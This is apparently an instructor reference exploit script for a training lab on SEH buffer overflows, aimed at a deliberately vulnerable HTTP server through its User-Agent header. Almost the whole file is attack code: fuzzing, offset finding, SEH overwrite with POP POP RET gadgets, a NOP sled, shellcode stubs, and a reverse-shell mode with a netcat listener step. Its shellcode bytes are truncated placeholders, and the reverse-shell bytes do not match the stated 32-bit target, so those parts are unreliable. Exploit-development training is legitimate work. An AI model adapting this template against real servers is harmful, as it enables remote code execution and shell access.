#!/usr/bin/env python3
"""
OSED Lab 2: Basic SEH (Structured Exception Handler) Overflow - Reference Exploit
==================================================================================

This is the instructor reference exploit for Lab 2.
Students should develop their own version following the lab guide.

Target: Vulnerable HTTP server on port 8080
Vulnerability: SEH buffer overflow in User-Agent header processing
Buffer size: 512 bytes
SEH overwrite: ~520-530 bytes offset
Architecture: 32-bit (simulated Windows 7)
Protections: NONE (ASLR, DEP, Stack Canaries disabled, SEH enabled but vulnerable)

Author: CyberLab Platform
Date: 2024
"""

import requests
import struct
import sys
import time
import socket

# Lab configuration
TARGET_IP = "10.13.37.10"
TARGET_PORT = 8080
TARGET_URL = f"http://{TARGET_IP}:{TARGET_PORT}"
ATTACKER_IP = "10.13.37.1"  # Adjust as needed
LISTEN_PORT = 4444

# SEH overflow details
BUFFER_SIZE = 512
SEH_OFFSET = 520  # Found through pattern analysis (may need adjustment)

# Example POP POP RET addresses (would be found through module analysis)
POP_POP_RET_GADGETS = [
    0x625011af,  # Example from system32 DLL
    0x625011bb,  # Alternative gadget
    0x77dc15a3,  # Another system gadget
]

class SEHExploit:
    def __init__(self, target_ip, target_port):
        self.target_ip = target_ip
        self.target_port = target_port
        self.target_url = f"http://{target_ip}:{target_port}"
        self.seh_offset = SEH_OFFSET
        self.pop_pop_ret = POP_POP_RET_GADGETS[0]  # Use first gadget
        
    def generate_pattern(self, length):
        """Generate a unique pattern for offset finding"""
        import string
        chars = string.ascii_letters + string.digits
        pattern = ""
        for i in range(length):
            pattern += chars[i % len(chars)]
        return pattern.encode()
    
    def test_connectivity(self):
        """Test basic HTTP connectivity to target"""
        try:
            response = requests.get(f"{self.target_url}/", timeout=10)
            print(f"[+] Target accessible: {response.status_code} - {response.reason}")
            print(f"[+] Server: {response.headers.get('Server', 'Unknown')}")
            return True
        except requests.exceptions.RequestException as e:
            print(f"[-] Connection failed: {e}")
            return False
    
    def enumerate_endpoints(self):
        """Enumerate available HTTP endpoints"""
        endpoints = ["/", "/status", "/vulnerable"]
        
        print("[*] Enumerating HTTP endpoints:")
        for endpoint in endpoints:
            try:
                response = requests.get(f"{self.target_url}{endpoint}", timeout=5)
                print(f"  {endpoint}: {response.status_code} - {len(response.content)} bytes")
            except:
                print(f"  {endpoint}: Connection error")
    
    def test_user_agent_processing(self):
        """Test User-Agent header processing"""
        print("[*] Testing User-Agent header processing...")
        
        test_cases = [
            ("Normal", "Mozilla/5.0 (Test Browser)"),
            ("Short", "A" * 50),
            ("Medium", "A" * 300),
            ("Large", "A" * 600),
            ("Oversized", "A" * 1000)
        ]
        
        for name, user_agent in test_cases:
            try:
                headers = {"User-Agent": user_agent}
                response = requests.get(f"{self.target_url}/status", 
                                      headers=headers, timeout=5)
                print(f"  {name} ({len(user_agent)} bytes): {response.status_code}")
            except requests.exceptions.RequestException as e:
                print(f"  {name} ({len(user_agent)} bytes): Connection error - {e}")
                if len(user_agent) > 500:
                    print(f"    ^ Possible overflow detected!")
    
    def find_seh_offset(self):
        """Send unique pattern to find SEH offset"""
        print(f"[*] Finding SEH offset using pattern...")
        
        # Generate unique pattern
        pattern = self.generate_pattern(1000).decode('latin1', errors='replace')
        
        try:
            headers = {"User-Agent": pattern}
            response = requests.get(f"{self.target_url}/vulnerable", 
                                  headers=headers, timeout=10)
            print(f"[+] Pattern sent successfully: {response.status_code}")
            
        except requests.exceptions.RequestException as e:
            print(f"[*] Pattern response: {e}")
            print("[!] Check server logs for SEH overwrite values")
        
        print(f"[!] Expected SEH offset: ~{self.seh_offset} bytes")
        print("[!] Use pattern_offset.rb to find exact offset from crash")
        return True
    
    def verify_seh_control(self):
        """Verify we can control SEH record"""
        print("[*] Verifying SEH record control...")
        
        # Build SEH control payload
        payload = (
            b"A" * self.seh_offset +     # Fill buffer to SEH record
            b"BBBB" +                    # Next SEH pointer
            b"CCCC" +                    # SEH handler address (should be 0x43434343)
            b"D" * 100                   # Additional data
        )
        
        try:
            headers = {"User-Agent": payload.decode('latin1', errors='replace')}
            response = requests.get(f"{self.target_url}/vulnerable", 
                                  headers=headers, timeout=10)
            print(f"[+] SEH control payload sent: {response.status_code}")
            
        except requests.exceptions.RequestException as e:
            print(f"[*] SEH control test result: {e}")
        
        print(f"[!] SEH handler should contain 0x43434343 (CCCC)")
        print(f"[!] Check debugger or crash logs for confirmation")
        return True
    
    def generate_shellcode(self, payload_type="calc"):
        """Generate shellcode for the exploit"""
        # Example shellcodes - in practice, use msfvenom
        
        if payload_type == "calc":
            # Simple calc.exe shellcode (example - replace with real)
            shellcode = (
                b"\x31\xdb\x64\x8b\x7b\x30\x8b\x7f\x0c\x8b\x7f\x1c"
                b"\x8b\x47\x08\x8b\x77\x20\x8b\x3f\x80\x7e\x0c\x33"
                b"\x75\xf2\x89\xc7\x03\x78\x3c\x8b\x57\x78\x01\xc2"
                # ... (example calc shellcode - use real msfvenom output)
            )
        elif payload_type == "reverse":
            # Reverse shell shellcode (example - replace with real)
            shellcode = (
                b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
                b"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
                # ... (example reverse shell - use real msfvenom output)
            )
        else:
            # Simple NOP + INT3 for testing
            shellcode = b"\x90" * 10 + b"\xcc"
        
        return shellcode
    
    def build_seh_payload(self, shellcode_type="calc"):
        """Build the complete SEH exploit payload"""
        print(f"[*] Building SEH exploit payload...")
        
        # Generate shellcode
        shellcode = self.generate_shellcode(shellcode_type)
        
        # NOP sled for reliability
        nop_sled = b"\x90" * 32
        
        # Build complete payload
        payload = (
            b"A" * self.seh_offset +                        # Fill buffer to SEH
            b"AAAA" +                                        # Next SEH (can be anything)
            struct.pack("<L", self.pop_pop_ret) +           # SEH handler: POP POP RET
            nop_sled +                                       # NOP sled
            shellcode                                        # Our shellcode
        )
        
        print(f"[+] SEH payload constructed:")
        print(f"    Buffer fill: {self.seh_offset} bytes")
        print(f"    Next SEH: 0x41414141 (AAAA)")
        print(f"    SEH handler: 0x{self.pop_pop_ret:08x} (POP POP RET)")
        print(f"    NOP sled: {len(nop_sled)} bytes")
        print(f"    Shellcode: {len(shellcode)} bytes")
        print(f"    Total payload: {len(payload)} bytes")
        
        return payload
    
    def exploit_target(self, shellcode_type="calc"):
        """Execute the complete SEH exploit"""
        print("\n" + "="*60)
        print("OSED LAB 2: SEH EXPLOIT EXECUTION")
        print("="*60)
        
        if shellcode_type == "reverse":
            print(f"[!] Set up your netcat listener first:")
            print(f"    nc -nvlp {LISTEN_PORT}")
            input("[?] Press Enter when listener is ready...")
        
        # Build exploit payload
        payload = self.build_seh_payload(shellcode_type)
        
        # Convert to string for HTTP header (handle encoding issues)
        try:
            payload_str = payload.decode('latin1')
        except UnicodeDecodeError:
            payload_str = payload.decode('latin1', errors='replace')
        
        # Prepare HTTP request
        headers = {"User-Agent": payload_str}
        
        print(f"[*] Targeting: {self.target_url}/vulnerable")
        print(f"[*] Sending SEH exploit payload...")
        
        try:
            response = requests.get(f"{self.target_url}/vulnerable", 
                                  headers=headers, timeout=15)
            print(f"[+] Exploit sent! Response: {response.status_code}")
            
            if shellcode_type == "reverse":
                print(f"[!] Check your netcat listener for shell connection")
            else:
                print(f"[!] Check target for payload execution")
            
        except requests.exceptions.RequestException as e:
            print(f"[*] Exploit result: {e}")
            print(f"[!] Connection behavior may indicate successful exploitation")
        
        return True
    
    def run_full_test_suite(self):
        """Run complete SEH exploitation test suite"""
        print("OSED Lab 2: SEH Exploitation Test Suite")
        print("=" * 50)
        
        # Step 1: Test connectivity
        if not self.test_connectivity():
            return False
        
        print()
        
        # Step 2: Enumerate endpoints
        self.enumerate_endpoints()
        print()
        
        # Step 3: Test User-Agent processing
        self.test_user_agent_processing()
        print()
        
        # Step 4: Find SEH offset
        self.find_seh_offset()
        print()
        
        # Step 5: Verify SEH control
        self.verify_seh_control()
        print()
        
        # Step 6: Execute exploit
        print("[?] Ready to execute SEH exploit? (y/n): ", end="")
        if input().lower() == 'y':
            self.exploit_target("calc")
        
        return True

def main():
    """Main exploitation routine"""
    print("OSED Lab 2: Basic SEH Overflow Exploit")
    print("=" * 45)
    print(f"Target: {TARGET_IP}:{TARGET_PORT}")
    print(f"Attack Vector: HTTP User-Agent header")
    print()
    
    # Initialize exploit class
    exploit = SEHExploit(TARGET_IP, TARGET_PORT)
    
    if len(sys.argv) < 2:
        print("Usage: python3 reference-exploit.py [action]")
        print()
        print("Actions:")
        print("  test      - Test basic connectivity and enumeration")
        print("  pattern   - Send pattern to find SEH offset")
        print("  control   - Verify SEH record control")
        print("  exploit   - Execute SEH exploit (calc.exe)")
        print("  shell     - Execute reverse shell exploit")
        print("  full      - Run complete test suite")
        return
    
    action = sys.argv[1].lower()
    
    if action == "test":
        exploit.test_connectivity()
        exploit.enumerate_endpoints()
        exploit.test_user_agent_processing()
        
    elif action == "pattern":
        exploit.find_seh_offset()
        
    elif action == "control":
        exploit.verify_seh_control()
        
    elif action == "exploit":
        exploit.exploit_target("calc")
        
    elif action == "shell":
        exploit.exploit_target("reverse")
        
    elif action == "full":
        exploit.run_full_test_suite()
    
    else:
        print(f"[-] Unknown action: {action}")
        print("[-] Use 'python3 reference-exploit.py' for help")

if __name__ == "__main__":
    main()